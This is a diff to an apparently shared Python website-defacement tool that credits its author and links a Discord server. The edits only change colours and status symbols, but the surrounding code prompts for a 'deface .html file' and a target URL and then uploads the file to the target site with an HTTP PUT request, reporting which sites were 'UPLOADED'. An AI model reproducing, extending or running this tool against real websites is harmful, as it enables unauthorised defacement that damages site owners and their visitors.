@@ -65,7 +65,7 @@ banner = f"""
                     
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓\t
 
-  \033[31m[♥\]Tool author  : O&N
+  \033[33m[♥\]Tool author  : O&N
 
    [♥\]Discord     : https://discord.gg/teHyE9Tgq7\t
    
@@ -94,17 +94,17 @@ def aox(script, target_url):
             site = "http://" + site
         req = s.put(site + "/" + script, data=op)
         if req.status_code > 200 or req.status_code >= 250:
-            print(m + "❌" + b + " FAILED" + m + " %s/%s" % (site, script))
+            print(m + ">" + b + " FAILED" + b + " %s/%s" % (site, script))
         else:
-            print(m + "✅" + h + " UPLOADED" + m + " %s/%s" % (site, script))
+            print(m + ">" + h + " UPLOADED" + h + " %s/%s" % (site, script))
     except requests.exceptions.RequestException:
-        print(m + "❌" + b + " FAILED" + m + " %s" % target_url)
+        print(m + ">" + b + " FAILED" + b + " %s" % target_url)
 
 def main(__bn__):
     print(__bn__)
     while True:
         try:
-            a = x("Enter your deface .html file: ")
+            a = x(f"\033[33mEnter your deface .html file: \t")
             if not os.path.isfile(a):
                 print("File '%s' not found" % a)
                 continue
@@ -115,7 +115,7 @@ def main(__bn__):
             exit()
 
     while True:
-        target_url = x(f"\033[31mEnter the target website URL (or press 'q' to quit): \t")
+        target_url = x(f"\033[33mEnter the target website URL (or press 'q' to quit): \t")
         if target_url.lower() == 'q':
             break
         aox(a, target_url)
